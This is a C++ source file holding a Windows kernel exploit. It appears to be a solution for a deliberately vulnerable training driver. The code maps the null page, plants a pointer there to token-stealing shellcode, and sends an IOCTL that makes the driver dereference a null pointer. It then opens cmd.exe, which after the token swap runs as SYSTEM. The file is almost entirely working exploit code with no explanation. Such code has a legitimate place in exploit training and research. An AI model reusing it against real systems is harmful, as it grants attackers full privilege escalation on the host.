#include <Windows.h>
#include "stdio.h"

#include "Solutions.h"
#include "ioctal_codes.h"
#include "TokenStealingShellcode.h"

typedef NTSTATUS(WINAPI* pNtAllocateVirtualMemory)(
		IN HANDLE ProcessHandle,
		IN OUT PVOID* BaseAddress,
		IN ULONG_PTR ZeroBits,
		IN OUT PSIZE_T RegionSize,
		IN ULONG AllocationType,
		IN ULONG Protect
	);

DWORD Solutions::TriggerNullPointerDereference() {
	LPVOID lpInBuffer = NULL;
	DWORD dwLen = 8;
	DWORD dwBytesReturned = 0;

	/*
	// allocate null page
	*/
	pNtAllocateVirtualMemory ntAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),
																								"NtAllocateVirtualMemory");
	if (!ntAllocateVirtualMemory) {
		wprintf(L"[-] Could not resolve NtAllocateVirtualMemory address\n");
		return 1;
	}

	PVOID BaseAddress = (PVOID)0x1;
	SIZE_T RegionSize = 0x1000;

	NTSTATUS res = ntAllocateVirtualMemory(GetCurrentProcess(), 
												&BaseAddress, 
												NULL, 
												&RegionSize,
												MEM_COMMIT | MEM_RESERVE,
												PAGE_EXECUTE_READWRITE);
	if (res != NULL) {
		wprintf(L"[-] Could not allocate null page - %d\n", res);
		return 1;
	}

	// we just allocated it :)
	const char* buf = 0;

	wprintf(L"[+] Allocated Null Page");
	*(PULONG)(buf + 4) = (ULONG)(&tokenStealingShellcodeWriteWhatWhere);

	lpInBuffer = (LPVOID)"AAAAAAAA";

	if (!DeviceIoControl(_hDeviceHandle, IOCTL_NULL_POINTER_DEREFERENCE,
		lpInBuffer, dwLen, NULL, NULL, &dwBytesReturned, NULL)) {
		wprintf(L"[-] Could not talk with the driver\n");
		return 1;
	}

	wprintf(L"[+] Succsfully talked with the driver\n");

	system("cmd.exe");
}